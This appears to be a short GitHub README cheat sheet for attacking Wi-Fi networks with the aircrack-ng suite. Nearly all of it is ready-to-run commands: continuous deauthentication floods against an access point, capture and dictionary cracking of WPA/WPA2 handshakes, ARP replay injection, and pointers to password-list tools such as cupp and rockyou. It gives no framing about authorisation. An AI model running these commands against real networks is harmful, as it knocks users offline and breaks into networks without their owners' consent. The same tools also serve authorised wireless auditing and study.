# Usage of some tools

In this example
- `mon0` is the name of your interface in monitor mode
- `XX:XX:XX:XX:XX:XX` is the bssid of target network
- `-c X` is the channel of target network

## Scan network around

```
airodump-ng mon0
```

![image](https://user-images.githubusercontent.com/90561566/166110658-56663408-8ef9-4681-a5d1-4e7ec4bd3562.png)

## [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication)

You can try it: https://github.com/lucthienphong1120/xDeauth

```
aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
or
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 mon0
```

Ctrl+C to stop deauth

## WPA/WPA2 Handshake capture

```
airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
aireplay-ng --deauth 5 -a 00:14:6C:7E:40:80 mon0
(wait for a few seconds)
aircrack-ng -w /path/to/dictionary out.cap
```

## ARP request

```
airodump-ng -c 6 -w out --bssid 00:13:10:30:24:9C mon0
aireplay-ng -0 10 -a 00:13:10:30:24:9C mon0
aireplay-ng -3 -b 00:13:10:30:24:9C -h 00:09:5B:EB:C5:2B mon0
```

## Brute force tools

Aircrack often uses brute force with some other tools as follows:

- [cupp](https://github.com/lucthienphong1120/cupp)
- /usr/share/wordlists/rockyou.txt.gz
- 




